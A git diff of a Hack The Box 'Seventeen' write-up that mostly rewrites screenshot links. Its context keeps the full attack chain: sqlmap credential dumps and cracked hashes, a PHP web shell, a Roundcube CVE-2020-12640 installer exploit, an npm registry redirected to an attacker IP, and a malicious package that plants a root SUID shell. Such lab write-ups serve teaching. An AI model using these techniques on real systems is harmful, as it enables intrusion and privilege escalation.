@@ -1,15 +1,15 @@
-![](seventeen%20logo.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/seventeen%20logo.png)
 
-![](Seventeen.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/Seventeen.png)
 
 
 ## nmap all ports
-![](Seventeen/screenshots/nmap%20all%20ports.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/nmap%20all%20ports.png)
 ## nmap services + versions
-![](Seventeen/screenshots/nmap%20services%20+%20versions.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/nmap%20services%20%2B%20versions.png)
 
 ## domain TCP 80 static--> new host: seventeen.htb
-![](domain%20tcp%2080.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/domain%20tcp%2080.png)
 
 ## wfuzz subdomains
 ````bash
@@ -17,17 +17,17 @@ wfuzz -u http://10.10.11.165 -H "Host:FUZZ.seventeen.htb" -w /opt/tools/SecLists
 
 `````
 
-![](wfuzz%20subdomains.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/wfuzz%20subdomains.png)
 
 ## domain: exam.seventeen.htb --> php
-![](domain%20exam.seventeen.htb.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/domain%20exam.seventeen.htb.png)
 
 ## searchsploit
-![](searchsploit.png)
-![](searchsploit%20poc.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/searchsploit.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/searchsploit%20poc.png)
 
 ### sqli id parameter
-![](sqli%20id%20parameter.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqli%20id%20parameter.png)
 
 ## sqlmap
 ### dump databases
@@ -36,7 +36,7 @@ sqlmap -r req.txt --dbs --batch --threads 10
 
 `````
 
-![](sqlmap%20dump%20databases.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20dump%20databases.png)
 
 ### dump tables of given databases
 ````bash
@@ -44,7 +44,7 @@ sqlmap -r req.txt --dbs --batch --threads 10 -D db_sfms,erms_db --tables
 
 `````
 
-![](sqlmap%20database%20tables.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20database%20tables.png)
 
 ### sqlmap dump tables
 ````bash
@@ -83,7 +83,7 @@ Hales:a1428092eb55781de5eb4fd5e2ceb835
 `````
 
 ### new possible domain: oldmangement.seventeen.htb
-![](sqlmap%20new%20possible%20subdomain.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20new%20possible%20subdomain.png)
 
 ## hashcat
 ````bash
@@ -96,18 +96,18 @@ Hales:a1428092eb55781de5eb4fd5e2ceb835
 `````
 
 ### login oldmanagement.seventeen.htb
-![](oldmanagement%20login.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/oldmanagement%20login.png)
 
 
 ### login with creds found by sqlmap and cracked with hashcat
 ### login dashboard
-![](Seventeen/screenshots/login%20dashboard.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/login%20dashboard.png)
 
 ### burp intercept file upload
-![](burp%20intercept%20file%20upload.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/burp%20intercept%20file%20upload.png)
 
 ### looking up the save_file.php file 
-![](save_file.php.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/save_file.php.png)
 ````php
 <?php
 
@@ -150,49 +150,49 @@ header('location: student_profile.php');
 ### --> files are saved to: /files/stud_no/filename
 
 ### accessing file is forbidden
-![](file%20access%20forbidden.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/file%20access%20forbidden.png)
 
 ### downloading Marksheet-finals.pdf
-![](sfms%20upload%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sfms%20upload%20file.png)
 
 ### --> new hostname: mastermailer.seventeen.htb
-![](Marksheet-finals.pdf%20extract.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/Marksheet-finals.pdf%20extract.png)
 
 
 ### mastermailer login
-![](mastermailer%20login.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20login.png)
 
 ### source code view --> roundcube
-![](mastermailer%20source%20code%20reveals%20roundcube.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20source%20code%20reveals%20roundcube.png)
 
 ### roundcube files to access to find out version/release of roundcube
-![](roundcube%20files%20to%20test.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20files%20to%20test.png)
 
 ### CHANGELOG request --> roundcube release:1.4.2
-![](mastermail%20changelog%20roundcube.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermail%20changelog%20roundcube.png)
 
 ### google roundcub 1.4.2 --> release date
-![](google%20roundcube%20release.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/google%20roundcube%20release.png)
 
 ### 2 critical CVEs
-![](roundcube%20CVEs.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20CVEs.png)
 
 ### references for cve-2020-12640 --> DrunkenShells --> POC
-![](roundcube%20cve%20links.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20cve%20links.png)
 
 ### POC cve-2020-12640
 - the installer must be present
 - a possibility to create a folder (already present: papers) and write a file to it (papers.php)
 
 ### roundcube installer step=1 is present
-![](roundcube%20installer.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20installer.png)
 
 ### wfuzz --> new folder papers 
-![](wfuzz%20oldmanagement.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/wfuzz%20oldmanagement.png)
 
 ## uplaod papers.php
 ### uploaded papers.php
-![](upload%20papers.php.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/upload%20papers.php.png)
 ### papers.php
 ````bash
 <?php 
@@ -211,10 +211,10 @@ system($_GET['cmd']);
 `````
 
 ### update installer config file
-![](roundcube%20mastermailer%20step2.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20mastermailer%20step2.png)
 
 ### burp intercept UPDATE CONFIG
-![](roundcube%20burp%20intercept%20update%20config.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20burp%20intercept%20update%20config.png)
 
 ### modifiy post data
 ```bash
@@ -231,15 +231,15 @@ _step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&_plugins_qwerty=../../..
 `````
 
 ### successfully saved new config file
-![](roundcube%20mastermailer%20save%20config.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20mastermailer%20save%20config.png)
 
 
 
 ### accessing any page of roundcube --> shell
-![](Seventeen/screenshots/shell%20as%20www-data.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/shell%20as%20www-data.png)
 
 ### 3 webservers are present
-![](webservers.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/webservers.png)
 
 ### new creds in: oldmanagement/db/db_sfms.sql
 ````
@@ -253,12 +253,12 @@ claire:827ccb0eea8a706c4c34a16891f84e7b
 root:2020bestyearofmylife
 
 `````
-![](mark.php%20shows%20require.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mark.php%20shows%20require.png)
 
-![](dbh.php%20new%20creds.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/dbh.php%20new%20creds.png)
 
 ### new creds in: mastermailer/config.inc.php
-![](config.inc.php%20new%20creds.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/config.inc.php%20new%20creds.png)
 
 ````
 mysqluser:mysqlpassword
@@ -276,13 +276,13 @@ mysqluser:mysqlpassword
 `````
 
 ### user mark on system --> try ssh as mark with found creds
-![](mastermailer%20users.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20users.png)
 
 ### ssh as mark successfull
-![](ssh%20mark.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20mark.png)
 
 ### user.txt
-![](Seventeen/screenshots/user.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/user.txt.png)
 
 ### kavi --> no access to it --> find files owned by kavi
 ````
@@ -290,10 +290,10 @@ find / -user kavi -ls 2>/dev/null
 
 `````
 
-![](var%20mail%20kavi%20read%20permission.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/var%20mail%20kavi%20read%20permission.png)
 
 ### kavi mail --> old logger replaced by loglevel
-![](Seventeen/screenshots/kavi%20mail.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/kavi%20mail.png)
 
 ### list listening ports on box
 ````
@@ -302,17 +302,17 @@ ss -lntp
 `````
 
 ### listening ports
-![](listening%20ports.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/listening%20ports.png)
 Port 8000 is not present --> it behalves as a loadbalancer to the 6000er ports via ip tables --> HTB
 
 ### tilde escape sequence in ssh shell
-![](ssh%20escape%20sequences%20list.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20escape%20sequences%20list.png)
 
 ### port forwarding localhost to: localhost:4873
-![](port%20forward%20localhost%20ssh%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/port%20forward%20localhost%20ssh%20shell.png)
 
 ### localhost:4873 -->npm registry
-![](localhost%204873.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/localhost%204873.png)
 
 ### getting all the packages installed on that registry
 ````
@@ -320,10 +320,10 @@ npm search --registry http://localhost:4873
 
 `````
 
-![](npm%20search%20installed%20packages%20on%20registry.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20search%20installed%20packages%20on%20registry.png)
 
 ### kavi mail 
-![](kavi%20mail%201.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/kavi%20mail%201.png)
 - db-logger --> old version
 - loglevel --> new one
 
@@ -334,10 +334,10 @@ npm install db-logger --registry http://localhost:4873
 
 `````
 
-![](npm%20install%20db-logger.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20install%20db-logger.png)
 
 ### logger.js --> new creds
-![](mysql%20login%20denied.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mysql%20login%20denied.png)
 
 ### mysql creds 
 ````
@@ -351,17 +351,17 @@ mysql -u root -p -D logger
 
 `````
 
-![](Seventeen/screenshots/ssh%20kavi%20successfull.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20kavi%20successfull.png)
 
 ### kavi has replaced old software db-logger by loglevel --> password found in db-logger --> maybe valid for ssh session as kavi
 ### ssh as kavi successfull
-![](ssh%20kavi%20successfull%201.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20kavi%20successfull%201.png)
 
 ### manipulating .npmrc file so that it is pointing at the attacker machine
-![](npmrc%20manipulate%20registry.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npmrc%20manipulate%20registry.png)
 
 ### nc port 4873 --> call back
-![](npm%20registry%20call%20back%20at%20me.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20registry%20call%20back%20at%20me.png)
 
 ### docker
 ````bash
@@ -376,7 +376,7 @@ sudo docker run -it --rm -p 4873:4873 verdaccio/verdaccio
 
 `````
 
-![](run%20docker%20locally.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/run%20docker%20locally.png)
 
 
 ### docker npm add user --> new authToken in .npmrc file
@@ -386,10 +386,10 @@ npm adduser --registry http://10.10.14.12:4873
 `````
 
 ### now authentication to registry is possible with authToken
-![](npmrc%20authToken.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npmrc%20authToken.png)
 
 ### npm init --> version must be greater than installed version
-![](npm%20version%20loglevel.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20version%20loglevel.png)
 
 ### npm init --> setup new npm package
 ````bash
@@ -397,7 +397,7 @@ npm init
 
 `````
 
-![](npm%20init.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20init.png)
 
 ### create malicious index.js file
 ````js
@@ -431,7 +431,7 @@ require('child_process').exec("chown root:root /tmp/shell;chmod 4755 /tmp/shell"
 `````
 
 ### node.js rev shell not working
-![](npm%20shell%20not%20working.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20shell%20not%20working.png)
 
 ### npm publish package
 ````
@@ -439,19 +439,19 @@ npm puplish --registry http://10.10.14.12:4873
 
 `````
 
-![](npm%20publish%20package.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20publish%20package.png)
 
 ### npm package.json edit version
-![](npm%20package.json.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20package.json.png)
 
 ### callback but no interaction in shell possible
-![](almost%20reverse%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/almost%20reverse%20shell.png)
 
 ### ssh kavi: copy /bin/bash --> /tmp/shell
-![](create%20copy%20of%20bin%20bash.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/create%20copy%20of%20bin%20bash.png)
 
 ### tmp/shell permissins before and after --> tmp/shell is now a SUID binary owned by root
-![](make%20tmp%20shell%20a%20SUID%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/make%20tmp%20shell%20a%20SUID%20file.png)
 
 ### getting root shell by abusing SUID file
 ````
@@ -463,11 +463,12 @@ npm puplish --registry http://10.10.14.12:4873
 
 `````
 
-![](abusing%20SUID%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/abusing%20SUID%20file.png)
+
 ### root shell
-![](shell%20root.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/shell%20root.png)
 
 ### root.txt
-![](Seventeen/screenshots/root.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/root.txt.png)
 
 XXXXXx
